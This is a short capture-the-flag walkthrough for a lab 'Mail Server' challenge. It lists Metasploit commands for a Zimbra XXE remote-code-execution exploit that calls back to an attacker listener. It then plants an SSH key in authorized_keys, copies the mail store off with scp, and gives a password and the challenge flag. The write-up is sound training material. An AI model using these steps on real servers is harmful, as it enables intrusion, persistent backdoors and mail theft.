# Mail Server

1. **Address:** `172.16.3.67`
2. **Find vulnerability:** [Exploit-DB](https://www.exploit-db.com/exploits/46693)
3. **Run Metasploit:**

    ```shell
    msfconsole -q
    use exploit/linux/http/zimbra_xxe_rce
    set RHOST 172.16.3.67
    set RPORT 443
    set LHOST 10.8.0.29
    set LPORT 4747

    # -j will run it as a JOB
    run
    ```

    > **Attention:** Password: `Zimbra2024`

4. **Check SSH Keys (Create One, if needed):**

    ```shell
    cat ./id_ed25519.pub

    # Create If You Don't Have one
    ssh-keygen -t ed25519 -f ./id_ed25519 -N ""
    ```

5. **Set public Key:**

    ```shell
    echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOCswCp0rS8p6Ost8dvKK7ZQHrrgfEYo1JM1cEroUnY4 danial@pop-os" > ~/.ssh/authorized_keys
    ```

6. **SSH into Server:**

    ```shell
    ssh -i ./id_ed25519 zimbra@172.16.3.67 -p 2200
    ```

7. **Download Zimbra Data:**

    ```shell
    scp -P 2200 -i ./id_ed25519 -r zimbra@172.16.3.67:/opt/zimbra/store/0 ./08-store0
    ```

8. **Check Emails and Decode Files:** [CyberChef](https://gchq.github.io/CyberChef/)
9. **Flag:** `MAZAPA_f7fcfe674431022cab7ae571058b1327`
